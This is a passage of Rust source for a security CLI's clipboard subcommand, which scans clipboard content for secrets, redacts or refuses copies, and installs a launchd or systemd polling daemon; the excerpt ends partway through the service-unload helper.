//! `tirith clipboard` — read/write/scan/guard the system clipboard (M7 ch3).
//!
//! Six user-facing actions:
//!
//! - `tirith clipboard copy <file>` — read a file, refuse to copy if it
//!   contains High-severity (secret-shaped) findings; with `--redact
//!   --audience <a>` apply the M7 ch2 redaction engine and copy the
//!   sanitized content instead.
//! - `tirith clipboard scan` — read the current clipboard, run the paste
//!   pipeline (`engine::analyze` with `ScanContext::Paste`) over its
//!   contents, and print the verdict.
//! - `tirith clipboard guard install-service [--apply]` — print (or
//!   write on `--apply`) the OS-correct service unit that drives the
//!   foreground daemon.
//! - `tirith clipboard guard uninstall-service` — remove the unit.
//! - `tirith clipboard guard status` — report whether the service is
//!   loaded.
//! - `tirith clipboard daemon --foreground` — the polling loop. Hidden
//!   from `--help`; the LaunchAgent/systemd service uses it as
//!   `ExecStart`.
//!
//! ## Why a service unit, not a shell-profile `&` background
//!
//! Spawning the daemon from `~/.zshrc` via `tirith clipboard guard on &`
//! produces orphaned processes on subshells, duplicate daemons on
//! window reload, and no clean-shutdown handle for `uninstall`. We
//! deliberately ship only the launchd/systemd path here and document
//! the manual `tirith clipboard daemon --foreground &` escape hatch.
//!
//! ## Headless clipboard backends
//!
//! Linux without `$DISPLAY`/`$WAYLAND_DISPLAY` (CI, plain SSH) and
//! Windows session 0 don't have a clipboard. The helpers in
//! `tirith_core::clipboard` translate that into `ClipboardError::NoBackend`,
//! which we render as a soft "no clipboard backend" envelope under
//! `--json` and a stderr note under `--human` — exit 0 in both, so a CI
//! lane that runs `tirith clipboard scan` for hygiene doesn't fail.

use std::fs;
use std::io::Write;
use std::path::{Path, PathBuf};
use std::time::Duration;

use tirith_core::clipboard::{read_clipboard_text, write_clipboard_text, ClipboardError};
use tirith_core::engine::{self, AnalysisContext};
use tirith_core::extract::ScanContext;
use tirith_core::output;
use tirith_core::redact::{redact_for_audience_with_custom, ShareAudience};
use tirith_core::tokenize::ShellType;
use tirith_core::verdict::Severity;

/// Maximum file size we will read for `tirith clipboard copy`.
/// Matches `tirith paste`'s 1 MiB cap — the system clipboard isn't a
/// blob store, and copying a 100 MB file is almost certainly a mistake.
const MAX_COPY_BYTES: u64 = 1024 * 1024;

/// Daemon poll interval. 2s is short enough to catch most legitimate
/// copy → paste flows and long enough to keep idle CPU near zero.
const POLL_INTERVAL: Duration = Duration::from_secs(2);

/// Audit-debounce window. The daemon polls every 2s; without a debounce
/// a clipboard pinned to a single secret would produce 30 audit entries
/// per minute. One entry per *distinct content* per minute is the spec.
const DEBOUNCE_WINDOW: Duration = Duration::from_secs(60);

// ---------------------------------------------------------------------------
// JSON envelopes
// ---------------------------------------------------------------------------

/// Scan / no-backend envelope. The `status` field is the single
/// machine-readable signal — `"ok"`, `"no_backend"`, or `"empty"`.
#[derive(serde::Serialize)]
struct ScanEnvelope<'a> {
    status: &'a str,
    #[serde(skip_serializing_if = "Option::is_none")]
    verdict: Option<&'a tirith_core::verdict::Verdict>,
    #[serde(skip_serializing_if = "Option::is_none")]
    error: Option<&'a str>,
}

/// `guard status` JSON envelope.
#[derive(serde::Serialize)]
struct GuardStatusEnvelope<'a> {
    platform: &'a str,
    unit_path: Option<String>,
    installed: bool,
    loaded: bool,
}

/// `guard install-service` JSON envelope (printed with --apply).
#[derive(serde::Serialize)]
struct GuardInstallEnvelope<'a> {
    platform: &'a str,
    unit_path: Option<String>,
    written: bool,
    loaded: bool,
}

// ---------------------------------------------------------------------------
// `tirith clipboard copy <file>`
// ---------------------------------------------------------------------------

/// Read `path`, run a paste-context analyze; refuse on a High-severity
/// finding unless `redact` is set. With `redact`, apply the audience-aware
/// redactor first and copy the sanitized content.
///
/// Returns the process exit code: 0 on copy succeeded, 1 on refused /
/// I/O failure / no clipboard backend.
pub fn copy(path: &Path, redact: bool, audience: Option<&str>, json: bool) -> i32 {
    // ---- read input ------------------------------------------------------
    let input = match read_file_capped(path) {
        Ok(s) => s,
        Err(code) => return code,
    };

    // ---- analyze for High-severity findings ------------------------------
    // A local file being copied is NOT a paste from a recorded web source, so
    // forbid the on-disk sidecar read: `AbsentOrInvalid`. Otherwise a file
    // whose content hash-matches the current `clipboard_source.json` record
    // could spuriously fire `PasteSourceMismatch` on an unrelated copy.
    let verdict = analyze_as_paste(
        &input,
        tirith_core::clipboard::ClipboardSourceState::AbsentOrInvalid,
    );
    let has_high = verdict
        .findings
        .iter()
        .any(|f| f.severity >= Severity::High);

    if has_high && !redact {
        // Refuse: don't copy secret-shaped content.
        if json {
            let env = ScanEnvelope {
                status: "refused",
                verdict: Some(&verdict),
                error: Some(
                    "secret-shaped content detected; rerun with --redact to copy a sanitized version",
                ),
            };
            write_json_or_complain(&env);
        } else {
            eprintln!(
                "tirith clipboard copy: secret-shaped content detected; rerun with `--redact` to copy a sanitized version"
            );
        }
        return 1;
    }

    // ---- choose the bytes to write to the clipboard ----------------------
    let to_copy: String;
    let mut redact_summary: Option<String> = None;
    if redact {
        let aud = match audience {
            Some(a) => match ShareAudience::parse_cli(a) {
                Some(a) => a,
                None => {
                    eprintln!(
                        "tirith clipboard copy: invalid audience '{a}' (expected one of: {})",
                        ShareAudience::cli_values().join(", ")
                    );
                    return 2;
                }
            },
            // --redact without --audience defaults to `generic` (== llm),
            // matching the M7 ch2 docs that call `generic` the safe default.
            None => ShareAudience::Generic,
        };
        // Customer-ID patterns are repo-specific; for the clipboard CLI we
        // skip the policy lookup (off-hot-path) and use the empty default.
        // `tirith share` is the documented surface for policy-aware redaction.
        let report = redact_for_audience_with_custom(&input, aud, &[]);
        let summary = if report.redactions.is_empty() {
            "no redactions applied".to_string()
        } else {
            report
                .redactions
                .iter()
                .map(|r| format!("{} {}", r.count, r.label))
                .collect::<Vec<_>>()
                .join(", ")
        };
        redact_summary = Some(summary);
        to_copy = report.redacted_content;
    } else {
        to_copy = input;
    }

    // ---- write to clipboard ----------------------------------------------
    match write_clipboard_text(&to_copy) {
        Ok(()) => {
            if json {
                let env = serde_json::json!({
                    "status": "copied",
                    "bytes": to_copy.len(),
                    "redacted": redact,
                    "redactions_summary": redact_summary,
                });
                let mut stdout = std::io::stdout().lock();
                if serde_json::to_writer_pretty(&mut stdout, &env).is_err()
                    || writeln!(stdout).is_err()
                {
                    eprintln!("tirith clipboard copy: failed to write JSON output");
                    return 1;
                }
            } else {
                eprintln!(
                    "tirith clipboard copy: copied {} bytes to clipboard",
                    to_copy.len()
                );
                if let Some(s) = redact_summary {
                    eprintln!("tirith clipboard copy: redactions: {s}");
                }
            }
            0
        }
        Err(ClipboardError::NoBackend) => {
            emit_no_backend(json, "copy");
            1
        }
        Err(e) => {
            eprintln!("tirith clipboard copy: {e}");
            1
        }
    }
}

// ---------------------------------------------------------------------------
// `tirith clipboard scan`
// ---------------------------------------------------------------------------

/// Read the current clipboard, run the paste pipeline, print the verdict.
///
/// Exit codes match `tirith paste`:
/// - `0` — Allow (no findings, or no clipboard backend in --json mode)
/// - `1` — Block (High-severity finding)
/// - `2` — Warn (Medium-severity finding)
///
/// The `--json` envelope distinguishes the no-backend / empty paths
/// from a real verdict via the `status` field.
pub fn scan(json: bool) -> i32 {
    match read_clipboard_text() {
        Ok(Some(text)) if !text.is_empty() => {
            // Analyzing the ACTUAL clipboard content: the companion sidecar
            // legitimately describes it, so `Unread` lets the engine consult
            // `clipboard_source.json` for paste-source attribution.
            let verdict =
                analyze_as_paste(&text, tirith_core::clipboard::ClipboardSourceState::Unread);
            if json {
                let env = ScanEnvelope {
                    status: "ok",
                    verdict: Some(&verdict),
                    error: None,
                };
                write_json_or_complain(&env);
            } else if output::write_human_auto(&verdict, false).is_err() {
                eprintln!("tirith clipboard scan: failed to write output");
            }
            verdict.action.exit_code()
        }
        Ok(_) => {
            // Empty clipboard or non-text payload — soft-pass, exit 0.
            if json {
                let env = ScanEnvelope {
                    status: "empty",
                    verdict: None,
                    error: None,
                };
                write_json_or_complain(&env);
            } else {
                eprintln!(
                    "tirith clipboard scan: clipboard is empty (or carries non-text content)"
                );
            }
            0
        }
        Err(ClipboardError::NoBackend) => {
            emit_no_backend(json, "scan");
            // Exit 0: the absence of a clipboard backend is not a failure,
            // it's a soft-degrade so CI runners and SSH sessions don't trip.
            0
        }
        Err(e) => {
            if json {
                let msg = e.to_string();
                let env = ScanEnvelope {
                    status: "error",
                    verdict: None,
                    error: Some(&msg),
                };
                write_json_or_complain(&env);
            } else {
                eprintln!("tirith clipboard scan: {e}");
            }
            1
        }
    }
}

// ---------------------------------------------------------------------------
// `tirith clipboard guard ...`
// ---------------------------------------------------------------------------

/// Print (and on `apply=true` write) the OS-correct service unit.
///
/// macOS → `~/Library/LaunchAgents/sh.tirith.clipboard.plist` + `launchctl load`
/// Linux → `~/.config/systemd/user/tirith-clipboard.service` + `systemctl --user enable --now`
/// Windows → not supported in service mode (print guidance).
pub fn install_service(apply: bool, json: bool) -> i32 {
    let platform = service_platform();
    let unit_path = service_unit_path();
    let unit_content = match render_service_unit() {
        Some(s) => s,
        None => {
            // Windows: no LaunchAgent / systemd. Foreground only.
            if json {
                let env = GuardInstallEnvelope {
                    platform,
                    unit_path: None,
                    written: false,
                    loaded: false,
                };
                write_json_or_complain(&env);
            } else {
                eprintln!(
                    "tirith clipboard guard install-service: service-mode clipboard guard is not supported on Windows.\n  Run `tirith clipboard daemon --foreground` in a long-running terminal instead.",
                );
            }
            return 1;
        }
    };

    if !apply {
        // Dry-run: print the unit content to stdout. JSON mode wraps it
        // in the envelope for scripted callers.
        if json {
            let env = serde_json::json!({
                "platform": platform,
                "unit_path": unit_path.as_ref().map(|p| p.display().to_string()),
                "written": false,
                "unit_content": unit_content,
            });
            let mut stdout = std::io::stdout().lock();
            if serde_json::to_writer_pretty(&mut stdout, &env).is_err() || writeln!(stdout).is_err()
            {
                eprintln!("tirith clipboard guard: failed to write JSON output");
                return 1;
            }
        } else {
            if let Some(p) = unit_path.as_ref() {
                eprintln!(
                    "tirith clipboard guard install-service: dry-run; would write to {}",
                    p.display()
                );
                eprintln!("tirith clipboard guard install-service: rerun with --apply to install.");
            }
            // Print unit content to stdout so it can be redirected.
            print!("{unit_content}");
        }
        return 0;
    }

    // --apply path: write the unit, then load it.
    let path = match unit_path.as_ref() {
        Some(p) => p,
        None => {
            // Defensive: render_service_unit returned Some but
            // service_unit_path returned None. Treat as unsupported.
            eprintln!(
                "tirith clipboard guard install-service: no unit path resolved for this platform"
            );
            return 1;
        }
    };

    // Idempotency: if the file already exists with matching content,
    // skip the write but still attempt to (re-)load.
    // Idempotency: only write when the on-disk content differs from
    // (or fails to read as) the rendered unit. A `matches!` keeps the
    // intent obvious to clippy and a reader.
    let needs_write = !matches!(fs::read_to_string(path), Ok(existing) if existing == unit_content);

    if needs_write {
        if let Some(parent) = path.parent() {
            if let Err(e) = fs::create_dir_all(parent) {
                eprintln!(
                    "tirith clipboard guard install-service: failed to create {}: {e}",
                    parent.display()
                );
                return 1;
            }
        }
        // macOS: ensure ~/Library/Logs exists so launchd doesn't get
        // EACCES on the StandardOutPath / StandardErrorPath we set in the
        // plist. systemd users get journald logs so this is no-op on Linux.
        #[cfg(target_os = "macos")]
        {
            if let Ok(home) = std::env::var("HOME") {
                let log_dir = PathBuf::from(home).join("Library/Logs");
                let _ = fs::create_dir_all(&log_dir);
            }
        }
        if let Err(e) = fs::write(path, &unit_content) {
            eprintln!(
                "tirith clipboard guard install-service: failed to write {}: {e}",
                path.display()
            );
            return 1;
        }
    }

    let loaded = load_service();

    if json {
        let env = GuardInstallEnvelope {
            platform,
            unit_path: Some(path.display().to_string()),
            written: needs_write,
            loaded,
        };
        write_json_or_complain(&env);
    } else {
        if needs_write {
            eprintln!(
                "tirith clipboard guard install-service: wrote {}",
                path.display()
            );
        } else {
            eprintln!(
                "tirith clipboard guard install-service: {} already up to date",
                path.display()
            );
        }
        if loaded {
            eprintln!("tirith clipboard guard install-service: service loaded");
        } else {
            eprintln!(
                "tirith clipboard guard install-service: warning — could not confirm service load (see platform docs)"
            );
        }
    }
    0
}

/// Remove the service unit and unload it.
pub fn uninstall_service(json: bool) -> i32 {
    let platform = service_platform();
    let unit_path = match service_unit_path() {
        Some(p) => p,
        None => {
            eprintln!("tirith clipboard guard uninstall-service: not supported on this platform");
            return 1;
        }
    };

    let _ = unload_service();
    let removed = if unit_path.exists() {
        fs::remove_file(&unit_path).is_ok()
    } else {
        false
    };

    if json {
        let env = serde_json::json!({
            "platform": platform,
            "unit_path": unit_path.display().to_string(),
            "removed": removed,
        });
        write_json_or_complain(&env);
    } else if removed {
        eprintln!(
            "tirith clipboard guard uninstall-service: removed {}",
            unit_path.display()
        );
    } else {
        eprintln!(
            "tirith clipboard guard uninstall-service: nothing to remove (unit not present at {})",
            unit_path.display()
        );
    }
    0
}

/// Report whether the service unit is installed and loaded.
pub fn status(json: bool) -> i32 {
    let platform = service_platform();
    let unit_path = service_unit_path();
    let installed = unit_path.as_ref().map(|p| p.exists()).unwrap_or(false);
    let loaded = is_service_loaded();

    if json {
        let env = GuardStatusEnvelope {
            platform,
            unit_path: unit_path.as_ref().map(|p| p.display().to_string()),
            installed,
            loaded,
        };
        write_json_or_complain(&env);
    } else {
        match unit_path.as_ref() {
            Some(p) => eprintln!(
                "tirith clipboard guard status: platform={platform}, unit={}, installed={installed}, loaded={loaded}",
                p.display()
            ),
            None => eprintln!(
                "tirith clipboard guard status: platform={platform} (service-mode not supported); use `tirith clipboard daemon --foreground`"
            ),
        }
    }
    0
}

// ---------------------------------------------------------------------------
// `tirith clipboard daemon --foreground`
// ---------------------------------------------------------------------------

/// The polling loop. Reads the clipboard every `POLL_INTERVAL`; when
/// content matches secret-shaped patterns, emits a stderr warning and
/// writes an audit-log entry. Debounces by content SHA-256 within a
/// 60s window so a pinned secret produces at most one entry per minute.
///
/// Designed to run under launchd / systemd-user — never returns; the
/// service manager owns lifecycle. Under `--foreground` interactive
/// use, Ctrl-C terminates via SIGINT delivered to the loop.
///
/// In JSON mode, each event is printed as a single line of JSON on
/// stdout so a log forwarder can ingest it directly.
pub fn daemon_foreground(json: bool) -> i32 {
    use std::collections::HashMap;
    use std::time::Instant;

    // (content_sha256_hex → last seen Instant) for debounce.
    let mut seen: HashMap<String, Instant> = HashMap::new();

    // Silent-failure fix (Sev-5): persistent clipboard read errors used to
    // be swallowed silently — an operator saw a "running" daemon failing
    // every 2s for hours. Rate-limit by error string so transient errors
    // stay quiet but a stuck-error condition surfaces (one stderr line per
    // minute per distinct message).
    let mut last_logged_error: HashMap<String, Instant> = HashMap::new();
    const ERROR_LOG_RATE: std::time::Duration = std::time::Duration::from_secs(60);

    // First read: tell stderr the daemon is alive so an operator
    // watching `journalctl -u tirith-clipboard --user` sees something.
    if json {
        let env = serde_json::json!({
            "event": "daemon_start",
            "poll_interval_ms": POLL_INTERVAL.as_millis() as u64,
            "debounce_window_ms": DEBOUNCE_WINDOW.as_millis() as u64,
        });
        let _ = println_json(&env);
    } else {
        eprintln!(
            "tirith clipboard daemon: polling every {}s; debounce {}s",
            POLL_INTERVAL.as_secs(),
            DEBOUNCE_WINDOW.as_secs()
        );
    }

    loop {
        std::thread::sleep(POLL_INTERVAL);

        let text = match read_clipboard_text() {
            Ok(Some(t)) if !t.is_empty() => t,
            Ok(_) => continue,
            Err(ClipboardError::NoBackend) => {
                // Headless: nothing to do. Sleep longer so we don't burn
                // CPU on a doomed retry.
                std::thread::sleep(POLL_INTERVAL * 30);
                continue;
            }
            Err(e) => {
                // Rate-limited stderr log so a persistent failure (perms,
                // backend crash) surfaces without spamming the journal.
                let key = e.to_string();
                let now_inst = Instant::now();
                let should_log = last_logged_error
                    .get(&key)
                    .map(|prev| now_inst.duration_since(*prev) >= ERROR_LOG_RATE)
                    .unwrap_or(true);
                if should_log {
                    last_logged_error.insert(key.clone(), now_inst);
                    if json {
                        let env = serde_json::json!({
                            "event": "clipboard_read_error",
                            "error": key,
                        });
                        let _ = println_json(&env);
                    } else {
                        eprintln!("tirith clipboard daemon: read error: {key}");
                    }
                }
                // GC the rate-limit map.
                last_logged_error.retain(|_, t| now_inst.duration_since(*t) < ERROR_LOG_RATE * 5);
                continue;
            }
        };

        let hash = sha256_hex(text.as_bytes());

        // Debounce: drop if we've seen this content within the window.
        let now = Instant::now();
        if let Some(last) = seen.get(&hash) {
            if now.duration_since(*last) < DEBOUNCE_WINDOW {
                continue;
            }
        }
        // Garbage-collect entries older than 5× the window so the map
        // doesn't grow unboundedly under a busy clipboard.
        seen.retain(|_, t| now.duration_since(*t) < DEBOUNCE_WINDOW * 5);
        seen.insert(hash.clone(), now);

        // Analyze the new content. Like `scan`, this is the ACTUAL clipboard
        // (read via `read_clipboard_text` above), so the companion sidecar
        // legitimately describes it — `Unread` lets the engine consult
        // `clipboard_source.json` for paste-source attribution.
        let verdict = analyze_as_paste(&text, tirith_core::clipboard::ClipboardSourceState::Unread);
        let has_high = verdict
            .findings
            .iter()
            .any(|f| f.severity >= Severity::High);

        if !has_high {
            continue;
        }

        // Audit + stderr warn. Silent-failure fix: previously `let _ = …`
        // swallowed audit-write failures, so `tirith last-trigger <event_id>`
        // returned nothing for the id (disk full / perms etc.). Match the
        // result and emit a stderr warning so the broken correlation is
        // debuggable.
        let event_id = uuid::Uuid::new_v4().to_string();
        if let Err(e) =
            tirith_core::audit::log_verdict(&verdict, &text, None, Some(event_id.clone()), &[])
        {
            eprintln!("tirith clipboard daemon: audit log write failed (event_id={event_id}): {e}");
        }

        if json {
            let env = serde_json::json!({
                "event": "secret_in_clipboard",
                "event_id": event_id,
                "rule_ids": verdict
                    .findings
                    .iter()
                    .map(|f| f.rule_id.to_string())
                    .collect::<Vec<_>>(),
                "content_sha256": hash,
            });
            let _ = println_json(&env);
        } else {
            eprintln!(
                "tirith clipboard daemon: secret-shaped content detected on clipboard (event_id={event_id}); see `tirith audit stats` / `tirith last-trigger`"
            );
        }
    }
}

// ---------------------------------------------------------------------------
// `tirith clipboard watch` (M12 ch1)
// ---------------------------------------------------------------------------

/// Poll the clipboard and report the attributed source URL each time the
/// companion browser extension records a NEW clipboard source whose content
/// hash matches the current clipboard.
///
/// The companion extension (a separate repo) writes
/// `state_dir()/clipboard_source.json` whenever it sets the clipboard. We watch
/// that file's mtime: when it advances AND `sha256(clipboard) ==
/// record.content_sha256`, we print the attributed source so an operator can see
/// "this clipboard content came from <url>" in real time. A no-op on a machine
/// without the extension (the file never appears).
///
/// Never returns under normal operation (Ctrl-C terminates). In `--json` mode
/// each attribution is one line of JSON on stdout.
pub fn watch(json: bool) -> i32 {
    use std::time::SystemTime;

    let Some(source_path) = tirith_core::clipboard::source_file_path() else {
        eprintln!("tirith clipboard watch: cannot resolve the tirith state directory");
        return 1;
    };

    if json {
        let env = serde_json::json!({
            "event": "watch_start",
            "source_file": source_path.display().to_string(),
            "poll_interval_ms": POLL_INTERVAL.as_millis() as u64,
        });
        // A write failure here means stdout is gone (e.g. a downstream `head`
        // closed the pipe). Exit cleanly rather than entering the poll loop — a
        // watcher with no reader has nothing to report to. See the per-event emit
        // below for the same handling.
        if println_json(&env).is_err() {
            return 0;
        }
    } else {
        eprintln!(
            "tirith clipboard watch: watching {} (polling every {}s); attributes the clipboard to its browser source",
            source_path.display(),
            POLL_INTERVAL.as_secs()
        );
    }

    // The last companion-record mtime we acted on, so we only report a source
    // once per extension write rather than every poll.
    let mut last_mtime: Option<SystemTime> = None;

    loop {
        std::thread::sleep(POLL_INTERVAL);

        // The companion record's current mtime. Absent file → nothing to do.
        let mtime = match std::fs::metadata(&source_path).and_then(|m| m.modified()) {
            Ok(t) => t,
            Err(_) => continue,
        };
        // Only act when the record is NEWER than the one we last reported.
        if last_mtime == Some(mtime) {
            continue;
        }

        // Read the record (fail-safe to None) and the current clipboard.
        let Some(record) = tirith_core::clipboard::read_source_record_at(&source_path) else {
            // Present but unreadable/malformed — advance the marker so we don't
            // re-read the same broken file every poll.
            last_mtime = Some(mtime);
            continue;
        };
        let clip = match read_clipboard_text() {
            Ok(Some(t)) if !t.is_empty() => t,
            Ok(_) => {
                last_mtime = Some(mtime);
                continue;
            }
            Err(ClipboardError::NoBackend) => {
                // Headless: back off and keep waiting.
                std::thread::sleep(POLL_INTERVAL * 30);
                continue;
            }
            Err(_) => {
                // Transient clipboard read failure (e.g. the selection is held by
                // another app this instant). Do NOT advance `last_mtime`: the same
                // source record should be retried on the next poll rather than
                // permanently skipped after one transient error.
                continue;
            }
        };

        // Attribute only when the clipboard content matches the recorded hash.
        let actual = sha256_hex(clip.as_bytes());
        last_mtime = Some(mtime);
        if !actual.eq_ignore_ascii_case(record.content_sha256.trim()) {
            // The record describes a different clipboard payload (a race, or the
            // clipboard was replaced by another app). Don't claim attribution.
            continue;
        }

        if json {
            let env = serde_json::json!({
                "event": "clipboard_source",
                "source_url": record.source_url,
                "source_title": record.source_title,
                "hidden_text_detected": record.hidden_text_detected,
            });
            // Stop watching when the JSON write fails: a broken pipe (the reader
            // closed stdout) means nobody is consuming events, so polling forever
            // would just spin. Exit cleanly. Mirrors the watch_start handling.
            if println_json(&env).is_err() {
                return 0;
            }
        } else {
            // Human mode: a broken pipe on stdout likewise means the reader is
            // gone; stop rather than polling forever.
            if writeln!(
                std::io::stdout(),
                "tirith clipboard watch: clipboard source: {}",
                record.source_url
            )
            .is_err()
            {
                return 0;
            }
        }
    }
}

// ---------------------------------------------------------------------------
// helpers — analysis & I/O
// ---------------------------------------------------------------------------

/// Run the engine in paste context over `input`. Used by `copy`
/// (pre-flight before writing to clipboard), `scan` (post-read), and the
/// `daemon` polling loop.
///
/// `clipboard_source` is threaded in by the caller rather than hardcoded:
/// it controls whether `engine::analyze` MAY consult the on-disk paste
/// sidecar (`clipboard_source.json`). The actual-clipboard paths (`scan`,
/// `daemon`) pass `Unread` — the sidecar legitimately describes the current
/// clipboard, so attribution is correct. The `copy` path analyzes the
/// contents of a LOCAL FILE being copied TO the clipboard — that file was
/// never pasted from a recorded web source, so it passes `AbsentOrInvalid`
/// to forbid the sidecar read. Otherwise a local file whose content happened
/// to hash-match the current sidecar record could spuriously fire
/// `PasteSourceMismatch` and warn/block an unrelated `tirith clipboard copy`.
fn analyze_as_paste(
    input: &str,
    clipboard_source: tirith_core::clipboard::ClipboardSourceState,
) -> tirith_core::verdict::Verdict {
    let raw_bytes = input.as_bytes().to_vec();
    let ctx = AnalysisContext {
        input: input.to_string(),
        shell: ShellType::Posix,
        scan_context: ScanContext::Paste,
        raw_bytes: Some(raw_bytes),
        interactive: false,
        cwd: std::env::current_dir()
            .ok()
            .map(|p| p.display().to_string()),
        file_path: None,
        repo_root: None,
        is_config_override: false,
        clipboard_html: None,
        card_ref: None,
        clipboard_source,
    };
    let mut verdict = engine::analyze(&ctx);
    // Apply paranoia filter against the active policy so the clipboard
    // surface honors the same severity threshold as `tirith paste`. A
    // brand-new policy snapshot is fine — clipboard analysis is rare
    // (off-hot-path) and consistency with `paste` matters more than
    // saving a discover() roundtrip.
    let policy = tirith_core::policy::Policy::discover_partial(None);
    engine::filter_findings_by_paranoia(&mut verdict, policy.paranoia);
    verdict
}

/// Read a file with a hard byte cap so a 100 MB log file doesn't
/// blow up the process. Errors are mapped to a CLI exit code.
fn read_file_capped(path: &Path) -> Result<String, i32> {
    let meta = match fs::metadata(path) {
        Ok(m) => m,
        Err(e) => {
            eprintln!(
                "tirith clipboard copy: failed to stat {}: {e}",
                path.display()
            );
            return Err(1);
        }
    };
    if meta.len() > MAX_COPY_BYTES {
        eprintln!(
            "tirith clipboard copy: {} exceeds {} bytes — refusing (the clipboard isn't a blob store)",
            path.display(),
            MAX_COPY_BYTES
        );
        return Err(1);
    }
    fs::read_to_string(path).map_err(|e| {
        eprintln!(
            "tirith clipboard copy: failed to read {}: {e}",
            path.display()
        );
        1
    })
}

/// Print `"no clipboard backend"` envelope/notice. `verb` is the
/// command verb ("scan", "copy") so the message points at the right
/// command in stderr mode.
fn emit_no_backend(json: bool, verb: &str) {
    if json {
        let env = ScanEnvelope {
            status: "no_backend",
            verdict: None,
            error: Some("no clipboard backend available (headless display server?)"),
        };
        write_json_or_complain(&env);
    } else {
        eprintln!(
            "tirith clipboard {verb}: no clipboard backend available (headless display server?)"
        );
    }
}

/// Hex-encode the SHA-256 of `bytes` — delegates to the shared core helper
/// (Greptile R1 #6) so the watch/scan debounce key, the paste-provenance rule,
/// and the `--with-source` display all hash clipboard content the same way.
fn sha256_hex(bytes: &[u8]) -> String {
    tirith_core::clipboard::content_sha256_hex(bytes)
}

/// Serialize `value` as a single line of JSON to stdout, followed by `\n`.
/// Used by the daemon's per-event emitter. Returns `Ok(())` on success.
fn println_json<T: serde::Serialize>(value: &T) -> std::io::Result<()> {
    let mut stdout = std::io::stdout().lock();
    serde_json::to_writer(&mut stdout, value)?;
    writeln!(stdout)
}

/// Pretty-print JSON to stdout with a trailing newline. Quietly drops
/// the error to stderr — the CLI exit code is what callers actually key on.
fn write_json_or_complain<T: serde::Serialize>(value: &T) {
    let mut stdout = std::io::stdout().lock();
    if serde_json::to_writer_pretty(&mut stdout, value).is_err() || writeln!(stdout).is_err() {
        eprintln!("tirith clipboard: failed to write JSON output");
    }
}

// ---------------------------------------------------------------------------
// helpers — service units
// ---------------------------------------------------------------------------

/// Short platform tag — printed in JSON envelopes and human messages.
fn service_platform() -> &'static str {
    #[cfg(target_os = "macos")]
    {
        "macos-launchd"
    }
    #[cfg(target_os = "linux")]
    {
        "linux-systemd-user"
    }
    #[cfg(target_os = "windows")]
    {
        "windows-foreground-only"
    }
    #[cfg(not(any(target_os = "macos", target_os = "linux", target_os = "windows")))]
    {
        "unsupported"
    }
}

/// Resolve `~` to the user's home directory using the `home` crate.
fn home_dir_or_none() -> Option<PathBuf> {
    home::home_dir()
}

/// Path the install-service action writes to. `None` on Windows
/// (foreground-only) and other unsupported platforms.
fn service_unit_path() -> Option<PathBuf> {
    let home = home_dir_or_none()?;
    #[cfg(target_os = "macos")]
    {
        Some(home.join("Library/LaunchAgents/sh.tirith.clipboard.plist"))
    }
    #[cfg(target_os = "linux")]
    {
        Some(home.join(".config/systemd/user/tirith-clipboard.service"))
    }
    #[cfg(target_os = "windows")]
    {
        let _ = home;
        None
    }
    #[cfg(not(any(target_os = "macos", target_os = "linux", target_os = "windows")))]
    {
        let _ = home;
        None
    }
}

/// Resolve the path to the current `tirith` binary for use as the
/// service's `ExecStart`. Falls back to the literal string `"tirith"`
/// (relying on PATH at service runtime) if `current_exe()` fails.
fn current_tirith_exe() -> String {
    std::env::current_exe()
        .ok()
        .and_then(|p| p.canonicalize().ok())
        .map(|p| p.display().to_string())
        .unwrap_or_else(|| "tirith".to_string())
}

/// Build the platform-correct service unit text. Returns `None` on
/// platforms that don't ship a service-mode lifecycle (Windows).
pub(crate) fn render_service_unit() -> Option<String> {
    let exe = current_tirith_exe();

    #[cfg(target_os = "macos")]
    {
        // Code-reviewer fix #6: log to per-user `~/Library/Logs/...` instead
        // of world-writable `/tmp`. On macOS `/tmp` is shared across local
        // users; a pre-existing symlink there written by another user would
        // redirect the daemon's logs. `~/Library/Logs` is private to the user.
        // The directory is created by `install_service` before launchctl load.
        let home = std::env::var("HOME").unwrap_or_else(|_| "/tmp".to_string());
        let out_log = format!("{home}/Library/Logs/sh.tirith.clipboard.out.log");
        let err_log = format!("{home}/Library/Logs/sh.tirith.clipboard.err.log");
        Some(format!(
            r#"<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>sh.tirith.clipboard</string>
    <key>ProgramArguments</key>
    <array>
        <string>{exe}</string>
        <string>clipboard</string>
        <string>daemon</string>
        <string>--foreground</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <true/>
    <key>StandardOutPath</key>
    <string>{out_log}</string>
    <key>StandardErrorPath</key>
    <string>{err_log}</string>
    <key>ProcessType</key>
    <string>Background</string>
</dict>
</plist>
"#
        ))
    }

    #[cfg(target_os = "linux")]
    {
        Some(format!(
            "[Unit]\n\
Description=tirith clipboard guard (M7 ch3)\n\
After=graphical-session.target\n\
PartOf=graphical-session.target\n\
\n\
[Service]\n\
Type=simple\n\
ExecStart={exe} clipboard daemon --foreground\n\
Restart=on-failure\n\
RestartSec=5\n\
\n\
[Install]\n\
WantedBy=graphical-session.target\n",
        ))
    }

    #[cfg(target_os = "windows")]
    {
        let _ = exe;
        None
    }

    #[cfg(not(any(target_os = "macos", target_os = "linux", target_os = "windows")))]
    {
        let _ = exe;
        None
    }
}

/// Load the service unit. Returns `true` on success-ish (best effort,
/// the actual loaded state is verified by `is_service_loaded`).
fn load_service() -> bool {
    #[cfg(target_os = "macos")]
    {
        // `launchctl load -w <plist>` is the documented "enable+load"
        // verb. The newer `bootstrap` API requires a domain target;
        // `load` works against the user's Aqua session implicitly.
        let path = match service_unit_path() {
            Some(p) => p,
            None => return false,
        };
        std::process::Command::new("launchctl")
            .args(["load", "-w"])
            .arg(&path)
            .status()
            .map(|s| s.success())
            .unwrap_or(false)
    }

    #[cfg(target_os = "linux")]
    {
        // `daemon-reload` is needed after writing the unit so systemd
        // picks it up; then `enable --now` flips it on for both this
        // session and future sessions.
        let _ = std::process::Command::new("systemctl")
            .args(["--user", "daemon-reload"])
            .status();
        std::process::Command::new("systemctl")
            .args(["--user", "enable", "--now", "tirith-clipboard.service"])
            .status()
            .map(|s| s.success())
            .unwrap_or(false)
    }

    #[cfg(not(any(target_os = "macos", target_os = "linux")))]
    {
        false
    }
}

/// Unload the service unit. Returns `true` when the unload command
/// reported success.
fn unload_service() -> bool {
    #[cfg(target_os = "macos")]
    {
